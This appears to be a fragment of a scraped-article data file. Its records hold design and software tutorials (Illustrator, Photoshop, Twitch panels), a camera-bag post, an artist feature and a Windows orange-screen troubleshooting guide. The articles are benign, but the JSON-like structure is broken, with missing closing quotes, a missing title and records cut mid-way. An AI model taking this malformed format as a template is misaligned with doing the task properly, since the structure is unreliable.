\nStart working on the needle by creating a 12 x 28 px rectangle with a 4 px thick Stroke ( #443D38 ) with a Round Join , which we will center align to the underlying Artboard . \nStep 7 \nAdjust the shape of the rectangle that we\u2019ve just created, by adding a new anchor point to the center of each of its edges by simply clicking on them using the Add Anchor Point Tool (+) . \nStep 8 \nAs soon as we\u2019ve added the new anchors, we\u2019ll need to remove the corners ones by simply clicking on them using the Delete Anchor Point Tool (-) . \nStep 9 \nRotate the resulting shape towards the right side, by first selecting it and then using the Rotate tool ( right click > Transform > Rotate > -45\u00ba ). \nStep 10 \nSince we\u2019re building the icon with Pixel-Perfection in mind, we\u2019ll need to turn on the Pixel Preview mode ( Alt-Control-Y ) and then snap all of the rotated shape\u2019s anchor points back to the Pixel Grid , by individually selecting them using the Direct Selection Tool (A) and then dragging them to the nearest grid intersection as seen in the reference image. Take your time, and once you\u2019re done switch back to the Default preview mode ( Alt-Control-Y ) before moving on to the next step. \nStep 11 \nFinish off the needle and with it the icon itself, by creating the filled section using a copy ( Control-C > Control-F ) of the shape that we\u2019ve just created, which we will adjust by first flipping its Stroke with its Fill ( Shift-X ), and then cutting it in half by removing its top-right anchor point using the Delete Anchor Point Tool (-) . Once you\u2019re done, select and group ( Control-G ) all of the needle\u2019s composing shapes, doing the same for the entire icon before hitting that save button. \nGreat Work! \nAs always, I hope you\u2019ve had fun working on this little project and most importantly managed to learn something new and useful during the process. \nThat being said, if you have any questions feel free to post them within the comments section and I\u2019ll get back to you as soon as I can! \nJust another coffee addict / pixel grinder, creating colorful projects one pixel at a time. \nThese icons link to social bookmarking sites where readers can share and discover new web pages.",

      "title": "Beginners, do you really need a camera bag?",
      "text": "If you\u2019re just starting out in photography, chances are you\u2019ve bought a camera with a kit lens and added a memory card and a strap to it. And now you need a bag to carry your new gear around. Or do you? In this video, James Popsys discusses why you may not need a dedicated camera bag after all, and why it could be clever to skip buying it, at least in the beginning. \nVIDEO \nIf you still have relatively little gear, James suggests you go for a regular backpack instead of buying a camera backpack. First of all, it will save you some money and you can invest it in a new lens or a trip. Another advantage is that a regular backpack won\u2019t draw too much attention. You can turn any bag into a camera bag with a few accessories , and it could be a better solution for a start. Plus, you can also fit other items along with your camera. \nAlternatively, you can go with a dedicated camera bag but choose a small shoulder bag. It will be enough for a camera and a lens, and you could add a few more personal items in it. There are some stylish models that don\u2019t look like camera bags ( such as this one ), so they won\u2019t draw much attention. On the downside, a bag like this won\u2019t be of much use if your gear collection grows. In this case, you\u2019ll need to get another, bigger camera bag with time. However, I think you can still use the smaller one when you want to pack light , or just take a casual walk with your camera and one lens. \nFinally, there could be a need for you to buy a dedicated camera backpack. As I mentioned, your gear collection might grow, so you may need more space to carry it. But also, if you immediately buy lots of gear, this is where it also makes sense to immediately buy a large backpack to carry it. Now, it could be quite a challenge to pick the perfect one . But perhaps you can find some inspiration and help here and here . \nNow, do you need that camera bag? You might, in some cases, but James\u2019 general advice for beginners is \u2013 don\u2019t get a dedicated camera bag. It won\u2019t help your photography, and it\u2019s an extra cost in the beginning when you already spend a lot of money on gear. \nPersonally, a camera bag was one of the first items I bought along with my first camera and a kit lens that came with it. It was around $30 if I remember well, and when it got all shabby, I bought another one exactly the same. It\u2019s the one in the photo above. Yes, I still have it, and still use it, because it comes in handy when I travel with just one lens, or just take a casual walk with my camera. The downside is that I can\u2019t fit anything else in it, but it\u2019s so small that I can put it in the backpack with my other stuff. Sure, I also have two larger bags for when I carry more gear, but honestly, in my case, that happens once in a blue moon. So, for me, this small camera bag was a perfect choice. It still is. \nStill, objectively speaking, I also think you might not actually need one if you\u2019re just starting out. At least not a large one. You can easily go with a small camera bag like the one I have, or even just a divider or a pouch you\u2019ll put in your regular bag. I recently got one, too, and I plan to use it. \nSo, what are your thoughts on the topic? Was a camera bag one of the first things you bought when you started doing photography? Or you bought it later? If you\u2019re a newbie, what\u2019s your plan when it comes to buying a bag? Let me know in the comments, I\u2019m curious to hear your thoughts.",

      "text": "Hello, and welcome back to yet another edition of Diversity in Design, a series here at Envato Tuts+! This is an ongoing exploration and collection of designers, illustrators, and other creative professionals\u2014each of them with a different focus, from different disciplines, cultures, and backgrounds. \nCelebrating and observing the unique creative voice of our peers can be very rewarding; there's so much we can share and learn from one another! Not to mention, it can be super inspiring to listen in and take a look at what other creative folks are up to! \nLet's take a look and a listen, together. \n4 Artists You Should Know: Diversity in Design \nSo, without further ado, let's check out this month's featured creators\u2014some of their inspiring works, as well as their insights, perspective, and thoughts on content creation. \nTim Gichuru (B\u00e9nir) \nI'm Tim Gichuru, a self-taught digital artist and graphic designer born and bred in Nairobi, Kenya with a bachelors degree in business information technology. \nI started out with the name B\u00e9nir which means bless because no matter what project I do, I'd like to dedicate it to the audience who are challenged in one way or another. \nTo me, life doesn't have a straight path, we're kind of pushed to run through this hurdles and bumps to reach where we want to be. \nI always aim to bring stories to life through my work and kind of twist realism to the unimaginable. \nMy creative process [starts] with a scribble to kind of visualize the idea that I have. I usually have a lot of ideas and I have to capture them in a note book. After this, I start the design process. \nWhat I would tell other creatives is: persistence is key to everything. I started out digital art and most of my friends were wondering why I'm doing this and I wont have any lucrative advantage in the end. \nBut believe me, everything works out. I've been able to achieve so many things that I never thought I'd have. \nYou can check out more of B\u00e9nir's wonderful work here: \nJace \"Kiwi\" M. \nMy name is Jace (but I also go by \"Kiwi\" online). I'm a Canadian background painter for animation, illustrator, and sequential artist living in Halifax, Nova Scotia. I make colourful illustrations and my work often focuses on LGBTQ+ themes, identity and magic. I'm currently working on a webcomic, Summertime Girlfriends, that is about a young woman who falls in love with a mermaid. \nI want to create work that is fun and full of love, while also exploring how we move through life and create bonds with one another. I have a deep attachment to stories that explore vulnerability in a brave way and I aspire to work on stories like that. \nMy goals include creating and boosting LGBTQ+ stories and artwork, as well as doing whatever I can to help other artists and creatives. I think it's important to put as much support as you can back into the industry you belong to so you can make space and boost new voices within it. \nI would describe my creative process as a cross between perseverance, passion and continuous learning. I'm so inspired by work that is being created today by my peers. With increasing access to professional grade tools and information online, there is this wonderful boom of beautiful work in indie comics and illustration that I find awe-inspiring. There's something about seeing all of this incredibly raw and vulnerable art that makes me think, \u201cYes! I want to be a part of this!\u201d \nMake what you love and the rest will follow. Meet and make friends with your peers in the industry. Be excited to grow your work together and support each other. There is no \u201ccorrect\u201d way to enter the industry (which can be frustrating), but please know that there is space for you and your work. You've got this! \nCheck out more of Kiwi's inspiring work here: \nFeonix Amadeus \nI'm Feonix! I\u2019m a self taught non-binary Canadian embroiderer. My personal work tends to focus on clothing. I use old clothes I've thrifted and work with them to make artworks you wouldn't usually expect from the medium. I almost always stick to line work for large pieces, with heavy contrast and bright colours. \nIt all started as a form of self-expression. The end goal is just to look cool, really. To decorate myself with things that I like, and that make me happy. I never had a goal of doing this professionally, since it just started as a hobby, but then people took notice and got interested. A lot of people started wanting my work on their own things. Which still blows my mind a bit, making things specifically that I liked and didn't expect anyone else to take notice in, and then having people want to identify with it to the world too. \nThe brunt of my inspiration comes from music I love. I'm a musician myself, and I'm completely entrenched in it. In the beginning I started with just band logos on my clothes, and then over time it developed into artworks based around songs or lyrics that just got bigger and grander. \nIt usually starts with me wanting to do something based off a specific artist or song, picking a lyric to work off, and then seeing where my heart takes me from there. I heavily lean towards the brightest colours I can find, contrasting them with black and white. A lot of the finishing touches are also based in geometry - I have a bit of a secret love for geometric shapes. \nStick with [your creative pursuits]. Try to do something a little bit out of your comfort zone with each project, and see how it turns out- mistakes are vital when it comes to improving. \nYou can check out more of Feonix's wonderful work right here: \nAnton Aladzhov \nAlthough I do mostly UI / UX design, I often describe myself as a \"Pixel Pusher\". The reason being that I've worked in startups for the last 5-6 years. And I worked for a long time as their only designer in the team. Which often meant I needed to work on the actual digital product / app but in addition: landing pages, marketing materials, prints, explanation videos, illustrations, infographics, and more. \nAnd I'm a firm believer that a designer can do a lot of stuff. So you are not just a logo designer, landing page designer, children illustrator etc. The process is fairly similar - 1. understand the fundamentals; 2. Do the research; 3. Sketch and iterate somehow; 4. Come up with a good-enough design. \nI'd like to make my clients and their users happy. I love the external validation - which is probably not a good thing, but for me when a client says \"I love it\" or returns to me with another project down the road - THIS IS GOLD. \nMy creative goals are to expand beyond visual design - maybe storytelling, blogging etc. And in my personal life I have different financial goals, fitness goals, travel goals, family goals etc. I think it's important to have different buckets for stuff that are important to you and at least have a direction for each. \nI'm really not the best example of a good process. Although, I spoke at a design event here in Sofia, Bulgaria and I asked who has a similar chaotic process to mine. I was pleasantly surprised that I'm not alone - most of the room raised their hands. If I need to break it down I have 3 phases: \nPre-Create - Getting into the right mindset & being inspired - Browsing Dribbble, Behance, Pinterest and other galleries get my interest and juices going. Then I do research on the particular thing I need to design and gather references, usually in the same places I mentioned. \nCreate - It's all chaos. First I drop in all the content and start pushing it, moulding it, figuring out a layout right there on the canvas. I think of it more like sculpture than traditional \"step by step\" process. Granted - sometimes I do sketches and wireframes first. \nAdjust - Once I have something I'm okay with I do a \"History Snapshot\" if I'm in Photoshop or duplicate the canvas if I'm somewhere else and do adjustments / iterations. \nSince I'm a co-host of a Design Podcast a few things come up fairly often. Here are some: \nFreelance or Business growth - Be friendly and network often... online or in person. \nMost of my early work came from people around me that knew what I did. And Jordan Peterson says something like \"If you know 100 people, you are one person away from knowing 100 000 people because each of them knows 100, too\". So make sure everybody knows what you do and don't reject work if you have none. \nIn terms of design skills - Learn the fundamentals & your software. \nDesign fundamentals have been written centuries ago - learn them. Things like composition, layout, contrast, gestalt principles for design, color theory etc. And when you open the software of choice it should feel like home. You should know where everything is all the necessary shortcuts, you should feel comfortable moving stuff around quickly, testing different layouts, not being scared etc. \nCheck out more of Anton's work right here: \nDo You Know an Artist We Should Know About? \nI'd like to extend a big, heartfelt thank you to B\u00e9nir, Kiwi, Feonix, and Anton for sharing their wonderful work, their insights, and their thoughts with us today! It's so inspiring to take a look at the work of other creatives and listen in on their process and inspiration. You are so inspiring! Thank you! \nAgain, you can check out more of their work here: \nDo you know of an artist or designer that you think we should feature?

      "title": "The Principles of Design",
      "text": "Have you ever wondered what goes into the creation of a successful design piece? Here are some visual tools that can help you structure your design compositions. \nIn this article, I'll show you the definition and importance of the principles of design. This set of visual tools can help you create an organized structure to deliver a clear message. These principles are also applied in art and different design sub-disciplines. Along with definitions, we'll show you a few principles of design examples that will help you better understand their meaning. \nWhat Are the Principles of Design? \nThe principles of design are a set of rules that designers can follow when creating a composition to create visually pleasing work. The purpose of these rules is to deliver a message in the most organized and functional way. \nHere's a list of the main design principles: \nBalance \nUnity \nContrast \nEmphasis \nRepetition \nPattern \nRhythm \nMovement \nProportion \nVariety \nHarmony \nWhile we\u2019ve seen a fair share of experimental pieces out there, it's important to know the significance of the fundamentals. Every design piece has a structure below the surface that holds up the design and makes it visually interesting and balanced. Once designers understand the usage of the principles, they\u2019ll understand better how to break these rules. \nIn my previous article, The Basic Elements of Design , I talked about the elements that create everything we perceive. With a solid understanding of those elements, you\u2019ll be able to learn more about the principles of design. \nPrinciples of Design: Balance \nAny element placed on a page carries a visual weight. It can range from form to size, color, and texture. In order to make a design feel stable or have balance, the elements need to have a certain scale. \nFor instance, in a symmetrical design, the elements on the right side have the same visual weight as the elements on the left side. Symmetrical designs are easier to balance but can also come across as boring. Asymmetrical designs have different sides but equal visual weight. Being able to achieve balance in asymmetry can result in a visually interesting design that has movement. \nLack of balance would make your design feel heavy on one side and empty on the opposite. You\u2019ll know your design lacks balance when it feels as if it\u2019s falling off to one side. \nPrinciples of Design: Unity \nUnity is the harmony produced by all the elements in a design piece. For instance, using similar colors that match and integrate elements organically makes it appear as if they belong together and are not just put on a page. \nYou can achieve unity by making clear relationships between visual elements. You can find unity wherever you find clear organization and order, and the elements of the page won\u2019t be fighting for attention. Instead, they\u2019ll work together to make the message stronger. Too much unity can result in a sterile design with a lack of personality. That\u2019s when you can start incorporating other elements to add movement. \nLack of unity would make your design feel cluttered and confusing. Viewers will be attracted to the wrong element of the design and won't get a clear message. A good rule of thumb is to place an element in your design only if it enhances the message. Ask yourself what the element is adding to the composition. \nPrinciples of Design: Contrast \nContrast refers to the level of difference between design elements in order to create visual hierarchies. The variation makes certain elements stand out more than others. You can apply contrast by using colors, textures, sizes, and shapes. \nIn a layout, contrast is applied to create hierarchy between the font sizes. Larger text tends to be read before any smaller text. Contrast is important when it comes to pairing fonts. For instance, in the example below, we have a font duo that includes a script font and a sans serif font. The script font adds movement to the static sans serif. \nContrast can create a focal point to certain elements that can draw the viewer\u2019s eyes. Contrast can also be used to create balance and harmony by making sure items are distributed nicely on a page. Lack of contrast can make a design look dull, and viewers can overlook the important message. Contrast is important especially when designing accessible documents. For instance, black type on a white background will be easier to read than black on a brown background. \nPrinciples of Design: Emphasis \nEmphasis is a strategy to get the viewer\u2019s attention to a specific design element. This can be in any form: a button, a website, or an image. The purpose is to create something that will stand out from the rest of the page. You can use different elements to highlight a specific part of your design, like lines, color, positive/negative relationships, and many more. As long as you can create contrast, either with elements or color, you\u2019ll be creating emphasis. \nLines create direction on a page by pointing to specific elements that help the viewer\u2019s eyes know where to go. \nShapes can also draw attention. Using a group of similar shapes and breaking the group with a different shape will create tension and draw the eyes. \nColor can create an emphasis in any design. Buttons on a website tend to contrast with the background to create a sense of urgency and attention. \nTexture can be seen in materials to enhance tactile features. For instance, a business card can have an emboss or relief on a logo to emphasize it. Digitally, texture can be applied as a drop shadow on a button to appear three-dimensional. \nSpace is also an option to emphasize certain elements in your design. Enough white space around an object can prioritize the focus on a single element. For instance, Apple has a clean and direct idea of emphasizing products. \nPrinciples of Design: Repetition \nUsing repeated elements on a layout can be pleasing to the viewer. Repetition is repeating a single element through the design. We can call a grid a repetition of lines because it creates a certain consistency. In layout design, repetition is shown through the folio placement to help viewers find their way in a book or magazine. The same folio placement creates continuity in the repetition. \nIn a website, repetition is seen on the menu placement, which gives the viewers a constant placement that can make them feel comfortable and familiar. Repetition can also be achieved by repeating elements in a design like a logo or a tagline in a brand development project. Below, the repetition of waves gives a feeling that the page is endless. \nPrinciples of Design: Pattern \nPattern is the repetition of more than one design element. While repetition focuses on a single element being repeated, pattern refers to multiple elements repeated throughout a design (e.g. wallpapers and backgrounds). \nA seamless pattern is a repeated set of elements that flows without a flaw to create a unit. You can see seamless patterns predominantly in interior design when using tiles. The use of patterns can enhance the viewer's experience and the look of a final design. \nIn the example below, the pattern repeats itself from edge to edge without any disruptions. The pattern is composed of multiple elements with varying sizes and depths. \nPrinciples of Design: Rhythm \nRhythm has more complexity than the previous principles of repetition and pattern. Repetition and pattern are applied to the same element throughout a design. Rhythm is the visual tempo of a combination of elements when used repeatedly, and with variation, it gives the feeling of organized movement. \nRhythm is usually hidden in works of art and is not as obvious as the design principles of repetition and pattern. In the example below, the diagonal lines aren't arranged in a specific pattern. Instead, there's a repetition of the elements with variations. \nPrinciples of Design: Movement \nMovement refers to the path the viewer\u2019s eye takes through a composition. In an image, every element can affect how the eyes move. Important elements will lead to secondary elements and so on. Movement in a composition creates interest and dynamism that keeps the viewer engaged. \nMovement can be created with rhythm when using a variation of an element repeatedly. Using curved lines and diagonal lines creates more movement compared to straight lines. Use lines to trace the path to the focal point. Color can help enhance the feeling of movement, juxtaposing high and low key colors to create energy. A literal way of showing movement is by using an image that includes motion, like a dancer or hair in the wind. Some artists use illusions like optical art, in which the repetition and contrast make our brains want to organize the information. \nIn the example below, movement is created by the slightly curved lines and the overlapping colors. Both effects enhance the movement because the lines are unstable and the gradient blurs the lines instead of being static. \nPrinciples of Design: Proportion \nProportion is the sense of unity created when all the elements in a composition relate well with each other. Proportion is mostly about scale and size when two elements are compared. For instance, in art and drawing, proportion is important for the elements to look realistic. Proportion doesn\u2019t necessarily refer to the size of one element but to the relationship of two or more elements. \nIn layout hierarchy, the proportion of the headline compared to the photo caption needs to be larger as the headline is the most important element. Smaller elements have less importance. When you achieve a good sense of proportion in a composition, it can add harmony and balance. \nPrinciples of Design: Harmony \nHarmony is the sense of cohesiveness between the elements in a composition. The elements shouldn\u2019t be exactly the same or completely different but related in some way. Color palettes or similar textures can create a sense of unity between different components. Using similarly shaped items will create harmony because they will seem related. \nNot enough or too much harmony can make a design dull; there needs to be some kind of variety for it to be visually interesting. \nPrinciples of Design: Variety \nCreating visual interest will keep viewers engaged with your design. Holding their attention and guiding them through the composition will create a powerful user experience. Variety adds something interesting to the composition to create contrast and tension. For instance, mixing organic shapes with geometric shapes adds variety. This concept should reinforce the message you are trying to communicate in your design\u2014otherwise, it can look pointless. \nThat's It! \nThe elements and principles of art and design are the foundation for creating a composition. The use of these principles can give structure and help you understand how other design pieces and artworks are built. It can help you determine whether a composition will be successful or determine the missing piece of the puzzle. \nThe use of these principles will help you design with purpose by giving function to every single element in a composition. Communicating a clear message isn't only about the message but how we carry it to deliver it cleanly and clearly. \nWhen you look at a design composition from now on, think of these principles and how they are being applied. You'll be able to decode the most intricate designs and understand what's working and what's not. \nIf you liked this article, you might like:",

      "title": "How to Fix Windows 10 Orange Screen of Death",
      "text": "When your Windows having functionality issues, it may display an orange screen of death, \u201cYour PC ran into a problem and needs to restart\u2026\u201d It\u2019s not common as compare to the blue screen of death or black screen of death but it occurs. If you are one of them who suffer this kind of issue then you are in the right place. This issue appears commonly by hardware failure, might be display or GPU. If you face this issue then your troubleshooting methods are right below. \nSome users describe this error: \nAdvertisement \n \n \n \n \nI just encountered a problem with my computer running on Windows 10. While starting an online game of Battlefield 4, the computer abruptly (of course it is abruptly when you get a Windows Screen of Death) showed an Orange screen of death, which to me felt unusual, since I am used to seeing a blue screen of death. \nMy desktop computer suddenly will not get past the orange startup screen. I was able to use remote desktop to access the system and everything was working normally. I tried restoring, which did not help. I then reset the computer (re-loaded Windows) which ended in the same result except now I can no longer use Remote Desktop to access the system at all. But I\u2019ve got all the white dots I\u2019ll ever need. \nWhenever I try to update and restart, the orange screen says it is updating. Several hours later the orange screen says it is undoing the updates because they can\u2019t be installed. Is it a driver problem or what??? Very frustrating situation. \nSteps to fix Windows 10 orange screen of death \nTry the given methods below one after other and hope this will solve the problem. \nRestart your computer \nFirst thing you should try is to restart your computer by the press and holding the power button while the orange screen appears. Press the button until your computer restart. Now check the problem is resolved or not. \nUnplug all the external unimportant hardware devices \nIf you have plugged-in external hardware\u2019s like, printer, mouse, headphone, webcams, extra monitors, external hardware\u2019s, etc and check if the problem is fixed or not. \nRemove Extra Display Apps or recently installed apps \nIf you have installed apps like Duet Display, soft SD, these apps can cause the system crash problem, which will show the orange screen of death. \nReset/Remove overclocking settings \nIf you set your Windows settings to overclock for better performance or you are just the gaming lover. Reset the overclocking setting to the default and remove all the tools which help to overclock CPU/GPU. \nUpdate graphic card drivers \nSometimes you need to update the drivers of your graphics card which are now not compatible with Windows after updating or installing any other app which is not compatible with the current version of your system drivers. To automatically update and compatible your Windows drivers follow the instruction below \nInstall the latest and compatible driver using Device manager \nTo install the latest drivers using the device manager you need to open Device Manager by right clicking on \u201cThis PC\u201d and click on Device manager from the left menu. \nTip : You can also open Device Manager by right clicking on Windows 10 start menu logo at bottom left corner and select Device Manager from the given list. \nThere is another way to open Device manager. Just presses the Windows button from your keyboard and without doing anything just type device manager , and then hit enter to open it. \nIn the Device manager, right click on any device which you want to install the latest driver and select update driver . \nNow click on Search automatically for updated driver software . It will automatically start searching for the lasted driver from the internet if new driver found you don\u2019t have to do anything it will be automatically downloaded and install. \nThis way you have to update your devices drivers one by one. If you don\u2019t want to install manually one by one then follow the next below steps to download and install all the drivers and necessary updates to your computer. \nInstall drivers using Windows Update \nTo install the latest drivers you can also use Windows update feature which is very handy for those who don\u2019t know which driver they need to download. \nOpen All Settings from the right bottom corner. \nClick on Update and Security. \nIn Windows update tab, click on Check for updates button. \nThat\u2019s it, Windows will first analyze your computer and then search and download all the updates including drivers updates, Windows updates, security patches, etc. this will takes the time you don\u2019t have to worry about anything. \nEnter Into Safe Mode (unable to boot due to the orange screen of death) \nIf you stuck at the boot screen and see the orange screen of death, then you have to enter into safe mode and perform the above steps to resolve the orange screen of death error. If you don\u2019t boot your computer then Enter into Windows 10 Safe Mode by following this guide.",

      "title": "How to Create a Disney Frozen Inspired Text Effect in Photoshop",
      "text": "In this tutorial we are going to create a text effect inspired by the Frozen Disney movies. The main concept is to show you how to create an ice texture effect with a variety of textures and text style attributes with Adobe Photoshop. \nTutorial Assets \nThe following assets were used during the production of this tutorial: \nBackground.psd \no-shape.psd \nCinzel OT1 Font \nPatterns.pat patterns file pack with four patterns inside. \nContour.shc contour file pack with one contour inside. \nDownload and Install the Pattern file \" Patterns.pat \". \nDownload and Install the Contour file \" Contour.shc\" . \nNote: To install, you have to double-click the icons. It's that simple. \nDownload and install the \"Cinzel OT1\" font. \nDownload both PSD files. \n1. How to Create the Text and Align It \nStep 1 \nOpen the file Background.psd . \nStep 2 \nType the word \"FrozE\" using the Cinzel OT1 font. Capitalize the first and the last letter. \nFont Size: 160 px \nTracking: -20 pt \nFont style: Black \nAnti-aliasing mode: Smooth \nColor: #ffffff \nStep 3 \nUsing the Move Tool , select the text and background layer, and then use the align commands on the top menu to center the text. \nAlign Horizontal: Center \nAlign Vertical: Center \n2. How to Add the \"o\" Shape \nIn order to create a dedicated work, we are going to use a custom shape to replace the \"o\" letter. \nStep 1 \nDelete the letter \"o\" and press the Spacebar three times. \nStep 2 \nOpen the o-shape.psd file and drag and drop the \"O shape\" to the main design. Select all three layers and align them as shown in the image below. \n3. How to Curve the Text \nSelect the text layer only and, using the Type Tool , select the Create Warped Text button and use the values shown in the image below. \nStyle: Arc Lower \nHorizontal: Checked \nBend: -10% \n4. How to Distort the Edges \nNow we are going to distort the edges to get an irregular ice effect. \nCreate a new layer style by double-clicking on the \"O Shape\" layer and apply the shape-pattern in Stroke options . \nGo to Layer Style > Stroke and use the values shown in the image below. \nSize: 2 px \nPosition: Outside \nBlend Mode: Normal \nOpacity: 100 % \nFill Type: Pattern \nPattern: Select the shape-pattern \" Frozen Edges \" \nScale: 100% \nLink with Layer checkbox: Checked \nNow repeat it with the text layer or copy and paste the layer style by clicking Alt and dragging the fx icon to apply the same layer style. \n5. How to Create a 3D Text Effect \nStep 1 \nSelect both layers and convert them to one Smart Object by Right-Clicking on the selected layers and then clicking Convert to Smart Object to start handling it as one piece. \nThen you have to duplicate the layer and rename both as \"Froze A\" and \"Froze B\". \nStep 2 \nTurn off the \"Froze A\" layer and duplicate the \"Froze B\" layer eight times. We are going to use these eight layers to create the 3D projection. \nStep 3 \nSelect the first \"Froze B\" layer and reduce it using the Free Transform option ( Control-T ). Lock the proportions by checking the loop icon and use the values shown in the image below. \nW: 99.50% \nH: 99.50% \nMaintain aspect ratio icon: Checked \nPress Enter to confirm the changes. \nStep 4 \nWe have to do the same process with the eight layers, one by one, reducing by 0.5% each time using the values shown in the image below. \nThis is because the font type has small details and the 3D projection needs to be constant and solid. \nFroze B: 99.50% \nFroze B: 99.00% \nFroze B: 98.50% \nFroze B: 98.00% \nFroze B: 97.50% \nFroze B: 97.00% \nFroze B: 96.50% \nFroze B: 96.00% \n6. How to Create the Main Layer Style \nAt this point, we have created the base to start the styling. \nStep 1 \nTurn on the \" Froze A \" layer and select it. Then double-click the selected layer to create a layer style and use the values shown in the image below. \nGo to Layer Style > Pattern Overlay , click on the Pattern box, and choose \" FrozeA \" from the list. This texture is the base of the text effects. \nStep 2 \nNow we are going to create a gradient overlay, which will give a fantasy ice color effect. Open the Layer Style again and modify the Gradient Overlay setting to the following values. \nBlend Mode: Soft Light \nOpacity: 100% \nReverse: Unchecked \nStyle: Linear \nAlign with Layer: Checked \nAngle 90\u00ba \nScale: 100% \nClick on the Gradient Bar and make a gradient with the settings below. \nTip: To create a new point in the gradient, you have to click under the gradient bar. Clicking each one of the color stops allows you to modify the Location and Color . \nFirst Stop Color: #9dd0ed \nFirst Stop Position: 0% \nSecond Stop Color: #71c5e9 \nSecond Stop Position: 26% \nThird Stop Color: #02b2ed \nThird Stop Position: 53 % \nFourth Stop Color: #1c6ba4 \nFourth Stop Position: 100% \nStep 3 \nNow we are going to emphasize the highlights to give more realism to the ice effect. Go to Layer Style > Satin and use the settings shown below. \nBlend Mode: Color Dodge \nColor: #ffffff \nOpacity: 10% \nAngle 170\u00ba \nDistance: 11 px \nSize: 20 px \nNow, we are going to add the previously installed \"Contour.shc\" file. Click on the Contour drop-down icon and then select the contour named \" Cove - Deep \". \nNow we can continue: \nAnti-aliased checkbox: Unchecked \nInvert checkbox: Checked \nStep 4 \nTo illuminate the edges and give the backlight a real look and feel, we are going to use the Outer Glow option. \nGo to Layer Style > Outer Glow and use the values shown below. \nBlend Mode: Color Dodge \nOpacity: 40% \nNoise: 0% \nColor: #d9ffff \nTechnique: Softer \nSpread: 0% \nSize: 1% \nContour: Default \nAnti-aliased: Unchecked \nRange: 70% \nJitter: 0% \nStep 5 \nWe are going to add a \"solar aura\" at the top, using the Drop Shadow option. Go to Layer Style > Drop Shadow and use the values shown in the image below. \nBlend Mode: Linear Dodge (Add) \nColor: #fff998 \nOpacity: 30 % \nAngle: -90\u00ba \nUse Global Light: Unchecked \nDistance: 100 px \nSpread: 0 px \nSize: 80 px \nContour: Default \nNoise: 0% \nLayer Knocks Out Drop Shadow: Checked \n7. How to Create the Second Layer Style \nStep 1 \nWe are getting close to the end. Now we have to select all the \"Froze B\" layers and convert them to a single Smart Object by Right-Clicking on the selected layers and choosing Convert to Smart Object to start handling it as one piece. \nStep 2 \nLet's add texture to the 3D layer by double-clicking the selected layer and using the values shown in the image below. \nGo to Layer Style > Pattern Overlay , click on the Pattern box, and choose \" FrozeB \" from the list. \nStep 3 \nTo match the color, add a Color Overlay with the following values. \nBlend Mode: Color Burn \nColor: #6ce3ff \nOpacity: 100% \nStep 4 \nAnd a Drop Shadow to give some distance from the background image. \nGo to Layer Style > Drop Shadow and use the values shown in the image below. \nBlend Mode: Multiply \nColor: #3dc3db \nOpacity: 60 % \nAngle: 90\u00ba \nUse Global Light: Unchecked \nDistance: 100 px \nSpread: 10 px \nSize: 90 px \nContour: Default \nNoise: 10% \nLayer Knocks Out Drop Shadow: Checked \n8.

      "text": "Setting up your live stream on Twitch? Want to create Twitch panels for your channel? Your panels are located below the stream\u2014this is a customizable space where you can add content for your audience. In this tutorial, we'll walk through how to make Twitch panels in Adobe Photoshop, as well as the basics of putting them to use. \nSo why have Twitch panels? What are they for? Well, the space below your stream can be a great place to share extra information with your audience, even when you aren't online. Things like your stream schedule, your social media links, your channel's rules, and more, can all go in this dedicated space. \nWhat's best for you and your channel is largely going to depend on your goals! That said, deciding on the best direction can be a little overwhelming. \nPlaceit is quickly becoming one of my favorite places for inspiration and quick design mockups. It also has a whole bunch of Twitch-related content\u2014from stream overlays to panels. It's great for brainstorming Twitch panel ideas! You can browse designs and customize them, right in your browser\u2014and I don't mean just the text, either. Change colors, move parts of the design, and more! If you're looking for an easy Twitch panel maker, here you go! \nAnd, again, this doesn't end with panels. Placeit has a whole host of fun, colorful, and eye-catching Stream Overlays, perfect for using with your favorite iteration of OBS. \nWhether you're looking for inspiration or for an entirely customizable, online Twitch panel creator, Placeit might just be what you're looking for. \nNow, let's dig in and make Twitch panels from scratch! \nWhat You'll Need \nThe following assets are used in this tutorial: \nKeep in mind that your Twitch panels should reflect your channel. What kind of aesthetic best suits your stream goals? \n1. How to Create Custom Twitch Panel Graphics \nStep 1 \nLet's start in Adobe Photoshop. Create a New Document . \nWe want our document to be 350 pixels wide \u2014the Twitch panel size will be scaled to 350 pixels in width. This means that, if you create or upload something larger, it's going to be adjusted to this size. In my opinion, it's often a stronger idea just to work with the given size\u2014in this case, 350 pixels. \nHowever, this also means we have some flexibility with height! We could, for example, work with a longer image or something short. It all depends on what information you'd like to share and how you'd like to share it. For example, Twitch info panels might benefit from smaller imagery and more text. A donation panel might benefit from a larger image. \nI'm going to go with 350 pixels wide by 125 pixels tall for my smaller Twitch panels. \nSelect Transparent as your Background Contents . \nOnce you're happy with your selections, click Create . \nStep 2 \nNotice the gray checkered background in our new document. This is how Photoshop indicates transparency\u2014so, for example, if we saved this image as a transparent PNG, this checkered space would appear transparent and \"empty\". \nI'm going to create a shape that doesn't fill our entire canvas, leaving some of this space transparent. \nLet's start out by creating a New Layer . \nGo to your Layers panel. If you don't see this panel, go to Window > Layers , at the top of your screen. \nCreate a New Layer by clicking on the New Layer icon , as highlighted, below. \nNote, you can rename your layers by clicking on the layer's name in the Layers panel. I often recommend this, because it helps keep your work organized\u2014especially if you end up with ten, twenty, or more layers! \nStep 3 \nTwitch has both a light and a dark theme. This means that any imagery we use here needs to work both on a light and a dark background. Our Twitch panels can also have transparency, so, again, it's important that visibility is strong both on dark and light backgrounds. \nI like to start off by creating a light background and a dark background, so I can easily toggle between the two and test my work. To do so, let's use our two layers. I renamed my layers Light Background and Dark Background. \nUse the Paint Bucket Tool to fill each layer with a different color\u2014white on the \"Light Background\" layer and a dark gray on the \"Dark Background\" layer. \nNot sure how to change your active colors? The foreground and background colors are located in your Tools panel. Simply click on the colored blocks to open the Color Picker and choose a new color. \nStep 4 \nNow, select the Rounded Rectangle Tool , in your Shape Tools. If you don't see the Rounded Rectangle Tool, click and hold on the active Shape Tool to expand this part of your Tools. You'll see you have lots of different shapes to choose from! \nWith the tool selected, take a look at your Options at the top of the screen. There, you can adjust the corner radius of your rectangle before you draw. This is how rounded the rectangle will be. I went with 25 pixels . \nThen, click and drag to draw a shape on our new layer. You can make this shape any color you prefer that works with our light and dark background. I went with a light blue! \nYou can adjust your shape using the Move Tool (toggle Show Transform Controls on, in your Options, to resize it). \nStep 5 \nNow, let\u2019s repeat this process, but with an ellipse. \nCreate a New Layer . Then, select the Ellipse Tool . \nClick and drag to create an ellipse. Position it on top of our rounded rectangle. \nStep 6 \nI want to merge these shapes together, so they're largely one shape. 